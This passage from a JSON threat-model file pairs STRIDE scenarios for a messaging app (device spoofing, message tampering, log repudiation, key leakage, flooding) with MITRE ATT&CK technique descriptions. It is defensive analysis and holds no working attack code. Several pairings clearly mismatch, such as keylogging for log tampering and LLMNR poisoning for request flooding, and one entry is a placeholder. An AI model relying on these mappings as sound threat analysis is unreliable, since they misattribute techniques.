                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised or spoofed companion device to masquerade as a user\u2019s trusted desktop client.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to compromise a device or create a malicious companion app.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has physical or remote access to another device."
                },
                {
                    "Assumption": "The primary device does not sufficiently verify the authenticity of the companion device.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks robust verification methods."
                },
                {
                    "Assumption": "Users trust and authorize companion devices without thorough checks.",
                    "Role": "User",
                    "Condition": "Valid if users do not scrutinize device authorization requests."
                }
            ],
            "Potential Impact": "Unauthorized access to user messages and data.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "identity theft",
                "authentication bypass",
                "device"
            ],
            "mitre_technique": {
                "name": "Network Devices",
                "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nCompromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",
                "id": "attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869",
                "technique_id": "T1584.008"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary uses a similar-sounding domain to trick users into thinking they are connecting to the legitimate messaging application.",
            "Assumptions": [
                {
                    "Assumption": "Users might not notice minor differences in domain names.",
                    "Role": "User",
                    "Condition": "Valid if users do not verify URLs accurately."
                },
                {
                    "Assumption": "The attacker is capable of setting up a phishing domain that looks similar to the legitimate one.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has resources to purchase similar domains."
                },
                {
                    "Assumption": "Users visit the phishing domain through phishing emails, messages, or search engine results.",
                    "Role": "User",
                    "Condition": "Valid if users are misled by phishing tactics."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "domain spoofing",
                "phishing",
                "social engineering",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters messages in transit by compromising the network between sender and recipient.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network path between sender and recipient.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not secure or the attacker has physical/remote access."
                },
                {
                    "Assumption": "The encryption protocol in use is flawed or improperly implemented.",
                    "Role": "Application",
                    "Condition": "Valid if vulnerabilities exist in the encryption protocol or its implementation."
                },
                {
                    "Assumption": "The attacker can perform man-in-the-middle (MitM) attacks on the E2EE channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has capabilities to intercept and alter encrypted communications."
                }
            ],
            "Potential Impact": "Corruption and tampering of data.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "message tampering",
                "data alteration",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the SQLite databases and modifies stored authentication credentials or messages.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database is not adequately protected with encryption.",
                    "Role": "Application",
                    "Condition": "Valid if encryption is weak or not implemented."
                },
                {
                    "Assumption": "The attacker has access to the device storing the SQLite databases.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker obtains physical or remote access to the device."
                },
                {
                    "Assumption": "There's no robust verification mechanism for the integrity of the stored data.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks data integrity checks."
                }
            ],
            "Potential Impact": "Unauthorized modification of user data and credentials.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data integrity",
                "credential modification",
                "device"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary exploits vulnerabilities in the application to inject malicious code that alters the application's behavior.",
            "Assumptions": [
                {
                    "Assumption": "The application's codebase has exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Valid if the application has not been properly tested or secured."
                },
                {
                    "Assumption": "The attacker can access and exploit these vulnerabilities remotely or locally.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attack surface is exposed to the attacker."
                },
                {
                    "Assumption": "Code injection leads to unauthorized code execution and behavior modification.",
                    "Role": "Attacker/Application",
                    "Condition": "Valid if the application does not have protections against code injection."
                }
            ],
            "Potential Impact": "Corruption of application data and behavior.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "application tampering",
                "unauthorized code execution",
                "device"
            ],
            "mitre_technique": {
                "name": "Native API",
                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
                "id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
                "technique_id": "T1106"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having sent a malicious message or file by tampering with the log files on the primary or companion devices.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored locally and are accessible.",
                    "Role": "Application",
                    "Condition": "Valid if logs are not adequately protected or encrypted."
                },
                {
                    "Assumption": "The attacker has access to the device storing these logs.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has physical or remote access to the device."
                },
                {
                    "Assumption": "The system does not have a tamper-evident logging mechanism.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks cryptographic protections for log integrity."
                }
            ],
            "Potential Impact": "Loss of data integrity and non-repudiation capabilities.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "activity repudiation",
                "data integrity",
                "device"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user or attacker manipulates message timestamps to alter the sequence of events in logged communications.",
            "Assumptions": [
                {
                    "Assumption": "Timestamp integrity is not ensured through cryptographic means.",
                    "Role": "Application",
                    "Condition": "Valid if timestamps are not securely signed or hashed."
                },
                {
                    "Assumption": "The attacker or user has access to modify the messages or the logs.",
                    "Role": "Attacker/User",
                    "Condition": "Valid if the attacker can intercept or access message logs."
                },
                {
                    "Assumption": "There is no strong verification of message sequence integrity.",
                    "Role": "Application",
                    "Condition": "Valid if the application does not verify the consistency of message sequences."
                }
            ],
            "Potential Impact": "Disruption of data integrity and sequence tracking.",
            "MITRE ATT&CK Keywords": [
                "timestamp manipulation",
                "sequence alteration",
                "data integrity",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters the metadata of messages to fake the origin or recipient, creating false records.",
            "Assumptions": [
                {
                    "Assumption": "Metadata integrity is not cryptographically ensured.",
                    "Role": "Application",
                    "Condition": "Valid if metadata lacks protections to prevent tampering."
                },
                {
                    "Assumption": "The attacker can intercept and alter message metadata in transit or on the device.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has access to the data stream or storage."
                },
                {
                    "Assumption": "No robust verification exists for metadata authenticity.",
                    "Role": "Application",
                    "Condition": "Valid if the application does not verify metadata integrity."
                }
            ],
            "Potential Impact": "Disruption of data integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "metadata tampering",
                "fake records",
                "data integrity",
                "device"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised device leaks the encryption keys used for end-to-end communication, revealing message contents.",
            "Assumptions": [
                {
                    "Assumption": "Encryption keys are stored on the device and can be accessed.",
                    "Role": "Application/User",
                    "Condition": "Valid if keys are not adequately protected or encrypted."
                },
                {
                    "Assumption": "The device is compromised either physically or through malware.",
                    "Role": "Attacker/User",
                    "Condition": "Valid if the device is exposed to unauthorized access or infection."
                },
                {
                    "Assumption": "There is no mechanism to detect and alert on unauthorized key retrieval.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks key retrieval monitoring."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "key leakage",
                "sensitive data exposure",
                "device compromise",
                "network"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the companion devices to access stored messages.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in the application running on companion devices.",
                    "Role": "Application",
                    "Condition": "Valid if companion apps have unpatched security flaws."
                },
                {
                    "Assumption": "The attacker can exploit these vulnerabilities locally or remotely.",
                    "Role": "Attacker",
                    "Condition": "Valid if the vulnerabilities are exploitable and within attacker's reach."
                },
                {
                    "Assumption": "There is no encryption or insufficient encryption for stored messages.",
                    "Role": "Application",
                    "Condition": "Valid if stored messages are not properly secured."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user messages.",
            "MITRE ATT&CK Keywords": [
                "device exploitation",
                "vulnerability exploitation",
                "data exposure",
                "companion devices"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized backup or synchronization action leaks messages to third-party cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Backup or sync actions can occur without user awareness or consent.",
                    "Role": "Application",
                    "Condition": "Valid if the application does not notify users of such actions."
                },
                {
                    "Assumption": "The backup destination is not encrypted or secured.",
                    "Role": "User",
                    "Condition": "Valid if users do not use secure cloud storage providers."
                },
                {
                    "Assumption": "Malware or a compromised device initiates unauthorized backup actions.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can control the backup process through malware."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "unauthorized backup",
                "data leakage",
                "cloud storage compromise",
                "device"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the application's servers with excessive requests, causing service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "The servers can be overwhelmed by a large number of requests.",
                    "Role": "Application",
                    "Condition": "Valid if the infrastructure lacks adequate handling for such flooding."
                },
                {
                    "Assumption": "The attacker has resources to generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has access to botnets or other resourceful means."
                },
                {
                    "Assumption": "There are no effective rate-limiting or traffic-handling mechanisms.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks protections against flooding attacks."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "flooding attack",
                "traffic overload",
                "denial of service",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits server vulnerabilities to crash the application or make it unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The application server has exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Valid if vulnerabilities are present and not patched."
                },
                {
                    "Assumption": "The attacker can probe and exploit these vulnerabilities remotely.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has means to target the server."
                },
                {
                    "Assumption": "The server does not have mechanisms to recover quickly from such attacks.",
                    "Role": "Application",
                    "Condition": "Valid if the server lacks resilient recovery methods."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "server exploitation",
                "vulnerability exploitation",
                "server crash",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infection spreads through the application, causing multiple user devices to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Malware can spread through the application via messages or attachments.",
                    "Role": "Application",
                    "Condition": "Valid if the application does not filter malicious content."
                },
                {
                    "Assumption": "The malware exploitation vector is not adequately blocked.",
                    "Role": "Application",
                    "Condition": "Valid if known malware vectors are not secured."
                },
                {
                    "Assumption": "User devices do not have sufficient security measures to prevent infection.",
                    "Role": "User",
                    "Condition": "Valid if user devices lack malware protection."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "malware spreading",
                "device infection",
                "service disruption",
                "device"
            ],
            "mitre_technique": {
                "name": "Disk Wipe",
